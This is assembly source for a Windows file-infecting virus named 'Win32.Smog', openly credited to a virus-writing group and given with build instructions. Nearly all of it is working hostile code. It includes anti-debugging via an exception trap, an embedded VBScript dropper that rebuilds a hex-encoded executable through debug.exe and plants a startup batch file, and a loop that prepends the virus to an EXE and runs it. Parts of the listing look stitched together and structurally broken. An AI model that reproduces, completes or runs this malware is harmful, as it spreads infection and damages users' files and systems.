;============================================================
;=== Win32.SMOG virus. Coded by Necronomikon[Zer0Gravity] ===
;============================================================
;Virusname: Win32.Smog
;------------------------------------------------------------
;Author: Necronomikon
;------------------------------------------------------------
;Group: Zero Gravity / Devilport Systems
;------------------------------------------------------------
;Infection:Win32.Smog is a runtime/direct action EXE virus. Infects
;first file in current directory, when executed, by prepending the virus to
;the original EXE file.
;------------------------------------------------------------
;Features:  - Open the CDRom-drive all 2Minutes
;           - Fuck Debuggers
;           - Display MessageBox 
;=======================================================
;  . To compile:
;=======================================================
;  TASM32 /M /ML /Q Smog.ASM
;  TLINK32 -Tpe -c -x -aa -r smog.OBJ,,, IMPORT32


.386
.model flat,stdcall
  
; KERNEL32.dll
        extrn   ExitProcess:proc
        extrn   FindFirstFileA:proc
        extrn   WinExec:proc
        extrn   _lclose:proc
        extrn   _llseek:proc
        extrn   _lopen:proc
        extrn   _lread:proc
        extrn   _lwrite:proc
        extrn   DeleteFileA:proc
        extrn   CopyFileA:proc
        extrn   MessageBoxA:proc
        extrn   SetCurrentDirectoryA:proc
        extrn   GetCommandLineA:proc
        extrn   CreateFileA:proc
        extrn   WriteFile:proc
        extrn   CloseHandle:proc 
        L            equ <LARGE>
.data
nec             dd      0               ; for write process
cont0           dd      0               ; for loops
cont1           db      0               ; for loops
fHnd            dd      ?    
hostName        db      260 dup(0)      ; space for save host name
chDir           db      260 dup(0)      ; space for save current dir
commandLine     dd      ?               ; handle for command line
sysTimeStruct   db      16 dup(0)       ; space for system time struct
szTitle         db      "Structured Exception Handler example",0
szMessage       db      "Intercepted General Protection Fault!",0

        .code

start:
        call    setupSEH                        ; The call pushes the offset
                                                ; past it in the stack rigth?
                                                ; So we will use that :)
exceptionhandler:
        mov     esp,[esp+8]                     ; Error gives us old ESP                          
                                                ; in [ESP+8]

        push    00000000h                       ; Parameters for MessageBoxA
        push    offset szTitle
        push    offset szMessage
        push    00000000h
        call    MessageBoxA

        push    00000000h                       
        call    ExitProcess                     ; Exit Application

setupSEH:
        push    dword ptr fs:[0]                ; Push original SEH handler
        mov     fs:[0],esp                      ; And put the new one (located
                                                ; after the first call)

        mov     ebx,0BFF70000h                  ; Try to write in kernel (will
        mov     eax,012345678h                  ; generate an exception)
        xchg    eax,[ebx]


scriptName      db      'smogdrop.vbs',0
vbsFile db 'rem VBS.Dropper for Win32.Smog',0,0dh,0ah
db 'On Error Resume Next',0,0dh,0ah
db 'rem VBS.Dropper for Win32.Smog',0,0dh,0ah
db 'MsgBox "Take this dropper!", 64,"Necronomikon[Zer0Gravity]"',0,0dh,0ah
db 'Dim BatFile, nec',0,0dh,0ah
db 'Set FSO = CreateObject("Scripting.FileSystemObject")',0,0dh,0ah
db 'Set nec = FSO.CreateTextFile("c:\Windows\smogdrop.dll", 2, False)',0,0dh,0ah
db 'nec.WriteLine "N SMOGDROP.EXE"',0,0dh,0ah
db 'nec.WriteLine "E 4D5A90000300000004000000FFFF0000B8000000000000004000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 00000000000000000000000000000000000000000000000B00000000E1FBA0E00B409CD21"',0,0dh,0ah
db 'nec.WriteLine "E B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444"',0,0dh,0ah
db 'nec.WriteLine "E F53206D6F64652E0D0D0A24000000000000005D171DDB19767388197673881976738819767"',0,0dh,0ah
db 'nec.WriteLine "E 38817767388E55661881876738852696368197673880000000000000000504500004C01030"',0,0dh,0ah
db 'nec.WriteLine "E 0F23624340000000000000000E0000F010B01050C000200000004000000000000001000000"',0,0dh,0ah
db 'nec.WriteLine "E 0100000002000000000400000100000000200000400000000000000040000000"',0,0dh,0ah
db 'nec.WriteLine "E 00000000040000000040000000000000200000000001000001000000000100000100000000"',0,0dh,0ah
db 'nec.WriteLine "E 000001000000000000000000000002820000050000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000200000280000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000002E74657874000000BC0000000010000"',0,0dh,0ah
db 'nec.WriteLine "E 00002000000040000000000000000000000000000200000602E726461746100003201000000"',0,0dh,0ah
db 'nec.WriteLine "E 2000000002000000060000000000000000000000000000400000"',0,0dh,0ah
db 'nec.WriteLine "E 402E64617461000000C40000000030000000020000000800000000000000000000000000004"',0,0dh,0ah
db 'nec.WriteLine "E 00000C000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000006A00680030400068273040006A00E88500000068"',0,0dh,0ah
db 'nec.WriteLine "E B0304000E88D000000689930400050E888000000A3C03040006A016A00FF15C03040006A0068"',0,0dh,0ah
db 'nec.WriteLine "E C0D401006A006A00E8570000006A006A006A00684F304000E83B00000083F800742EA1533040"',0,0dh,0ah
db 'nec.WriteLine "E 003D1301000075DF6A006A006A00686B304000E83E0000006A006A006A006881304000E82E00"',0,0dh,0ah
db 'nec.WriteLine "E 0000EBBD6A00E813000000CCFF2518204000FF2510204000FF2514204000FF2508204000FF25"',0,0dh,0ah
db 'nec.WriteLine "E 00204000FF2504204000FF252020400000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000000000000000000000000000000000000000000000000E2200000F6200000D42000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000AE200000BC200000A0200000000000001621000000000000882000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000C820000010200000782000000000000000000000082100000020000098200000000000"',0,0dh,0ah
db 'nec.WriteLine "E 000000000028210000202000000000000000000000000000000000000000000000E2200000F6"',0,0dh,0ah
db 'nec.WriteLine "E 200000D420000000000000AE200000BC200000A0200000000000001621000000000000280147"',0,0dh,0ah
db 'nec.WriteLine "E 65744D6573736167654100BB014D657373616765426F7841004D0253657454696D6572000055"',0,0dh,0ah
db 'nec.WriteLine "E 53455233322E646C6C000075004578697450726F63657373001101476574"',0,0dh,0ah
db 'nec.WriteLine "E 4D6F64756C6548616E646C65410000290147657450726F634164647265737300004B45524E45"',0,0dh,0ah
db 'nec.WriteLine "E 4C33322E646C6C000035006D636953656E64537472696E6741000057494E4D4D2E646C6C0000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000002A57"',0,0dh,0ah
db 'nec.WriteLine "E 696E33322E536D6F672844726F70706572292A46726573686572207468616E2061697221004B"',0,0dh,0ah
db 'nec.WriteLine "E 6F707977726F6E67206279204E6563726F6E6F6D696B6F6E205B5A657230477261766974795D"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000736574204344417564"',0,0dh,0ah
db 'nec.WriteLine "E 696F20646F6F72206F70656E00736574204344417564696F20646F6F7220636C6F7365640052"',0,0dh,0ah
db 'nec.WriteLine "E 656769737465725365727669636550726F63657373006B65726E656C33322E646C6C00000000"',0,0dh,0ah
db 'nec.WriteLine "E 00000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 00000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 0000000000000000000000000000000000000000000000000000000000000000000000000000"',0,0dh,0ah
db 'nec.WriteLine "E 00000000000000"',0,0dh,0ah
db 'nec.WriteLine "RCX"',0,0dh,0ah
db 'nec.WriteLine "82"',0,0dh,0ah
db 'nec.WriteLine "W"',0,0dh,0ah
db 'nec.WriteLine "Q"',0,0dh,0ah
db 'nec.WriteLine ""',0,0dh,0ah
db 'nec.Close',0,0dh,0ah
db 'Set BatFile = FSO.CreateTextFile("c:\Windows\WinStart.bat", 2, False)',0,0dh,0ah
db 'BatFile.WriteLine ""',0,0dh,0ah
db 'BatFile.WriteLine "@echo off"',0,0dh,0ah
db 'BatFile.WriteLine "debug < c:\windows\smogdrop.dll > nul"',0,0dh,0ah
db 'BatFile.WriteLine "c:\smogdrop.exe"',0,0dh,0ah
db 'BatFile.WriteLine ""',0,0dh,0ah
db 'BatFile.Close',0,0dh,0ah
db 'MsgBox "Fresher than air!", 48,"Win32.Smog"',0,0dh,0ah

endScript       db      0
scriptSize      equ     offset vbsDir0-offset vbsFile

vbsDir0        db      'c:\windows\start~1\progra~1\autost~1',0

end     start
; virus id and author
virusId         db      'Win32.SMOG',0
; message
mess            db      '*SMOG*Fresher than air...'
                db      0dh,0ah,'Coded by Necronomikon[ZeroGravity]',0
       
MAX_PATH                equ     0ffh
FALSE                   equ     00h
OF_READWRITE            equ     02h     ; Opens the file for reading and
                                        ; writing
SW_SHOW                 equ     05h     ; Activates the window and displays it
                                        ; in its current size and position

FILETIME struct
  dwLowDateTime         DWORD   ?       ; Specifies the low-order 32 bits of
                                        ; the file time
  dwHighDateTime        DWORD   ?       ; Specifies the high-order 32 bits of
                                        ; the file time
FILETIME ends

WIN32_FIND_DATA struct
  dwFileAttributes      DWORD   ?       ; Specifies the file attributes of the
                                        ; file found
  ftCreationTime        FILETIME <>     ; Specifies the time the file was
                                        ; created
  ftLastAccessTime      FILETIME <>     ; Specifies the time that the file was
                                        ; last accessed
  ftLastWriteTime       FILETIME <>     ; Specifies the time that the file was
                                        ; last written to
  nFileSizeHigh         DWORD   ?       ; Specifies the high-order DWORD value
                                        ; of the file size, in bytes
  nFileSizeLow          DWORD   ?       ; Specifies the low-order DWORD value
                                        ; of the file size, in bytes
  dwReserved0           DWORD   ?       ; Reserved for future use
  dwReserved1           DWORD   ?       ; Reserved for future use
  cFileName             BYTE MAX_PATH dup(?)
                                        ; A null-terminated string that is the
                                        ; name of the file
  cAlternate            BYTE 0eh dup(?) ; A null-terminated string that is an
                                        ; alternative name for the file
ends

FindFileData    WIN32_FIND_DATA <>
szFileName      db      '*.exe',00h     ; Name of file to search for
szNewFileName   db      'Necro.exe',00h
                                        ; Null-terminated string that
                                        ; specifies the name of the new file
cBuffer         db      ?               ; Buffer for read data, data to be
                                        ; written
cBuffer_        db      ?               ; Buffer for read data, data to be
                                        ; written
.code
code_begin:
        push    L 1030h                 ; show a message box
        lea     eax,virusId
        push    eax
        lea     eax,mess
        push    eax
        push    L 0
        call    MessageBoxA
skipPay:
        call    GetCommandLineA         ; get command line
        mov     dword ptr [commandLine],eax

        xor     esi,esi                
        lea     edi,hostName           
vbsCheck:
        lea     eax,vbsDir0
        push    eax
        call    SetCurrentDirectoryA
        cmp     eax,0
        je      installScript           

        
installScript:
        lea     eax,scriptName
        push    eax                     
        call    DeleteFileA

        push    L 0h
        push    L 20h                   ; archive
        push    L 1
        push    L 0h
        push    L (1h OR 2h)
        push    40000000h
        lea     eax,scriptName
        push    eax
        call    CreateFileA             ; open new script for write (shared)
        cmp     eax,-1
        je      retDir

        mov     dword ptr [fHnd],eax

        push    L 0
        lea     eax,nec
        push    eax
        mov     eax,scriptSize
        push    eax
        lea     eax,vbsFile
        push    eax
        push    dword ptr [fHnd]
        call    WriteFile               ; write file

        mov     eax,dword ptr [fHnd]    ; close file
        push    eax
        call    CloseHandle

retDir:
        lea     eax,chDir
        push    eax                     ; restore work directory
        call    SetCurrentDirectoryA
                
dcLoop:
        push    L 0
        lea     eax,nec
        push    eax
        push    L 1
        push    edi
        push    dword ptr [fHnd]
        call    WriteFile               ; write data

        cmp     byte ptr [edi],0ffh
        jne     skipFF

        dec     dword ptr [cont0]
        call    addFF
        inc     edi

skipFF:
        inc     edi
        dec     dword ptr [cont0]
        cmp     dword ptr [cont0],0
        jne     dcLoop

        push    dword ptr [fHnd]        ; close file
        call    CloseHandle


addFF:
        xor     ecx,ecx
        mov     cl,byte ptr [edi+1]
        mov     byte ptr [cont1],cl
        cmp     cl,0
        jne     addFFLoop
        ret

addFFLoop:
        push    L 0
        lea     eax,nec
        push    eax
        push    L 1
        push    edi
        push    dword ptr [fHnd]
        call    WriteFile               ; write data

        dec     byte ptr [cont1]
        cmp     byte ptr [cont1],0
        jne     addFFLoop

        ret

;

        lea     edi,[esp+10h]           ; EDI = pointer to buffer for module
                                        ; path
        push    edi                     ; EDI = pointer to buffer for module
                                        ; path
        repne   scasb                   ; Find end of filename
        mov     byte ptr [edi-01h],'.'  ; Store dot
        pop     edi                     ; EDI = pointer to buffer for module
                                        ; path

        push    offset FindFileData     ; Address of returned information
        push    offset szFileName       ; Address of name of file to search
                                        ; for
        call    FindFirstFileA

        push    FALSE                   ; If file already exists, overwrite it
        push    offset szNewFileName    ; Address of filename to copy to
        push    edi                     ; Address of name of an existing file
        call    CopyFileA

        push    OF_READWRITE            ; Opens the file for reading and
                                        ; writing
        push    offset FindFileData.cFileName
                                        ; Address of name of file to open
        call    _lopen
        mov     esi,eax                 ; ESI = file handle

        push    OF_READWRITE            ; Opens the file for reading and
                                        ; writing
        push    offset szNewFileName    ; Address of filename to copy to
        call    _lopen
        mov     edi,eax                 ; EDI = file handle

        xor     ebx,ebx                 ; Number of bytes read and written
        mov     ebp,0fffff000h          ; Number of bytes to move through
                                        ; source file
read_write_loop:
        push    00h                     ; Position to move from
        push    ebx                     ; Number of bytes to move
        push    esi                     ; Pointer to destination filename
        call    _llseek

        push    01h                     ; Length, in bytes, of data buffer
        push    offset cBuffer          ; Address of buffer for read data
        push    esi                     ; Pointer to destination filename
        call    _lread

        push    00h                     ; Position to move from
        push    ebx                     ; Number of bytes to move
        push    edi                     ; Pointer to source filename
        call    _llseek

        push    01h                     ; Length, in bytes, of data buffer
        push    offset cBuffer_         ; Address of buffer for read data
        push    edi                     ; Pointer to source filename
        call    _lread

        push    00h                     ; Position to move from
        push    ebx                     ; Number of bytes to move
        push    esi                     ; Pointer to destination filename
        call    _llseek

        push    01h                     ; Number of bytes to write
        push    offset cBuffer_         ; Address of buffer for data to be
                                        ; written
        push    esi                     ; Pointer to destination filename
        call    _lwrite

        push    02h                     ; Position to move from
        push    00h                     ; Number of bytes to move
        push    esi                     ; Pointer to destination filename
        call    _llseek

        push    01h                     ; Number of bytes to write
        push    offset cBuffer          ; Address of buffer for data to be
                                        ; written
        push    esi                     ; Pointer to destination filename
        call    _lwrite

        push    02h                     ; Position to move from
        push    ebp                     ; Number of bytes to move
        push    edi                     ; Pointer to source filename
        call    _llseek

        push    01h                     ; Length, in bytes, of data buffer
        push    offset cBuffer          ; Address of buffer for read data
        push    edi                     ; Pointer to source filename
        call    _lread

        push    00h                     ; Position to move from
        push    ebx                     ; Number of bytes to move
        push    edi                     ; Pointer to source filename
        call    _llseek

        push    01h                     ; Number of bytes to write
        push    offset cBuffer          ; Address of buffer for data to be
        push    edi                     ; Pointer to source filename
        call    _lwrite

        inc     ebx                     ; Increase number of bytes read and
                                        ; written
        inc     ebp                     ; Increase number of bytes to move
                                        ; through source file
        cmp     bx,1000h                ; Read and written all of the virus?
        jne     read_write_loop         ; Not equal? Jump to read_write_loop

        push    edi                     ; Handle of file to close
        call    _lclose

        push    SW_SHOW                 ; Activates the window and displays it
                                        ; in its current size and position
        push    offset szNewFileName    ; Address of filename to copy to
        call    WinExec
code_end:

end          code_begin